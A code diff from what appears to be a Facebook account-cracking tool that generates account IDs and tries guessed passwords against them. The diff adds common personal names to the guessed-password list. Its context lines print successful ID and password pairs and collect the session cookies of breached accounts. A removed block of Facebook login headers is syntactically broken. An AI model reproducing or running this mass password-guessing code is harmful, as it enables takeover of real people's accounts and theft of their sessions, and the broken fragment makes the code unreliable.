@@ -84,7 +84,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','farjana','jannatul','shakil','tasfiya']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' THE PROGRESS HAS BEEN COMPLETE ')
@@ -114,24 +114,6 @@ def method_crack(ids,passlist):
                     uid=ids
                 if str(uid) in oks:
                     break
-  header_freefb = {'authority': 'm.facebook.com',}
-    'method':'POST',
-    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
-    'scheme':'https',
-    'accept': '*/*',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://m.facebook.com',
-    'referer': 'https://m.facebook.com/',
-    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'x-asbd-id': '198387',
-    'x-fb-lsd': 'AVoPmsopEAk',
-    'user-agent': pro}
                 else:
                     print('\r\r \033[1;32m[bipul-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
